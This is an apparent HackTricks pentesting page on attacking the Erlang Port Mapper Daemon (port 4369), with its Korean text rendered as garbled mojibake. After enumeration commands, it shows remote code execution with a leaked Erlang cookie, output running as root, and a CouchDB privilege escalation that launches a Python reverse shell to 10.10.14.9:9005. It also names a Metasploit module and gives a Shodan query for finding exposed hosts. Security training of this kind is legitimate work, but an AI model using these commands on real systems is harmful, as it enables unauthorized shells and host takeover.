<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>


# ê¸°ë³¸ ì •ë³´

**Erlang Port Mapper Daemon (epmd)**ëŠ” ë¶„ì‚° Erlang ì¸ìŠ¤í„´ìŠ¤ì˜ ì¡°ì •ìë¡œ ì‘ë™í•©ë‹ˆë‹¤. ì´ëŠ” ì‹¬ë³¼ë¦­ ë…¸ë“œ ì´ë¦„ì„ ê¸°ê³„ ì£¼ì†Œì— ë§¤í•‘í•˜ì—¬ ê° ë…¸ë“œ ì´ë¦„ì´ íŠ¹ì • ì£¼ì†Œì™€ ì—°ê²°ë˜ë„ë¡ ë³´ì¥í•˜ëŠ” ì—­í• ì„ í•©ë‹ˆë‹¤. **epmd**ì˜ ì´ ì—­í• ì€ ë„¤íŠ¸ì›Œí¬ ìƒì—ì„œ ì„œë¡œ ë‹¤ë¥¸ Erlang ë…¸ë“œ ê°„ì˜ ì›í™œí•œ ìƒí˜¸ì‘ìš©ê³¼ í†µì‹ ì„ ìœ„í•´ ì¤‘ìš”í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
ì´ê²ƒì€ ê¸°ë³¸ì ìœ¼ë¡œ RabbitMQ ë° CouchDB ì„¤ì¹˜ì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤.

# ì—´ê±°

## ìˆ˜ë™
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## ìë™

The Erlang Port Mapper Daemon (EPMD) is a service that runs on the default port 4369 in Erlang-based systems. It is responsible for managing the distribution of Erlang nodes and facilitating communication between them.

EPMD provides a simple and lightweight protocol that allows Erlang nodes to register themselves and discover other nodes on the network. This makes it easier for Erlang applications to establish connections and communicate with each other.

As a pentester, it is important to understand EPMD and its potential security vulnerabilities. By exploiting weaknesses in EPMD, an attacker can gain unauthorized access to Erlang nodes and potentially compromise the entire system.

One common vulnerability is the lack of authentication in EPMD. By default, EPMD does not require any authentication, allowing anyone to connect to it and query information about registered nodes. This can be exploited by an attacker to gather information about the system and potentially launch further attacks.

Another vulnerability is the potential for EPMD to leak sensitive information. When a node registers with EPMD, it sends its name and IP address. This information can be intercepted by an attacker and used to gather intelligence about the system's architecture and potential targets.

To mitigate these vulnerabilities, it is recommended to secure EPMD by implementing authentication mechanisms. This can be done by configuring EPMD to require a password or by using SSL/TLS encryption to secure the communication between nodes.

Additionally, it is important to regularly update Erlang-based systems to ensure that any known vulnerabilities in EPMD are patched. By keeping the system up to date, you can minimize the risk of exploitation and protect your network from potential attacks.

In conclusion, understanding EPMD and its vulnerabilities is crucial for pentesters. By exploiting weaknesses in EPMD, an attacker can gain unauthorized access to Erlang nodes and compromise the system. Implementing authentication mechanisms and keeping the system up to date are essential for securing EPMD and protecting your network.
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## ì›ê²© ì—°ê²°

ì¸ì¦ ì¿ í‚¤ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆë‹¤ë©´ í˜¸ìŠ¤íŠ¸ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì´ ì¿ í‚¤ëŠ” `~/.erlang.cookie`ì— ìœ„ì¹˜í•˜ë©°, erlangì—ì„œ ì²˜ìŒ ì‹œì‘í•  ë•Œ ìƒì„±ë©ë‹ˆë‹¤. ìˆ˜ë™ìœ¼ë¡œ ìˆ˜ì •ë˜ê±°ë‚˜ ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°, ì´ëŠ” ê¸¸ì´ê°€ 20ì¸ ë¬´ì‘ìœ„ ë¬¸ìì—´ [A:Z]ì…ë‹ˆë‹¤.
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
ë” ë§ì€ ì •ë³´ëŠ” [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì €ìëŠ” ì¿ í‚¤ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ëŠ” í”„ë¡œê·¸ë¨ë„ ê³µìœ í•˜ê³  ìˆìŠµë‹ˆë‹¤:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## ë¡œì»¬ ì—°ê²°

ì´ ê²½ìš°ì—ëŠ” CouchDBë¥¼ ë‚¨ìš©í•˜ì—¬ ê¶Œí•œì„ ë¡œì»¬ë¡œ ìŠ¹ê²©ì‹œí‚¬ ê²ƒì…ë‹ˆë‹¤:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
ì˜ˆì‹œëŠ” [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.\
**Canape HTB ë¨¸ì‹ ì„ ì‚¬ìš©í•˜ì—¬** ì´ ì·¨ì•½ì ì„ **ê³µê²©í•˜ëŠ” ë°©ë²•ì„ ì—°ìŠµ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "at port"`


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™‘**](https://peass.creator-spring.com)ì„ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš”. ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
